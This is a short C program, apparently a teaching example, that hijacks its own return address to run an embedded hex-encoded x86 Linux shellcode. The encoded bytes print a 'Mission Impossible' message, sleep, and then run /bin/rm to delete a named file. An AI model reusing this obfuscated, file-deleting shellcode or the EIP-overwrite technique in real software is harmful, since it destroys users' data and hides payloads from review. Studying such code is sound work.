/*that is a example to change the eip to your shellcode*/
#include <stdio.h>

unsigned char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x0a\x68\x4e\x6f\x77\x21\x68\x52\x75\x6e\x20\x68\x6e\x74\x2c\x20\x68\x6e\x20\x48\x75\x68\x45\x74\x68\x61\x89\xe1\xb0\x04\xb2\x15\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x50\x50\x6a\x78\x89\xe3\xb0\xa2\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x72\x6d\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x66\x68\x78\x65\x68\x6c\x65\x2e\x65\x68\x73\x73\x69\x62\x68\x69\x6d\x70\x6f\x68\x69\x6f\x6e\x5f\x68\x6d\x69\x73\x73\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80";


int main(){

	int *ret;	//esp-4 
	ret =(int*)&ret+2; //esp+2*4,that is eip
	(*ret) = (int)shellcode; //change the eip to shellcode

}
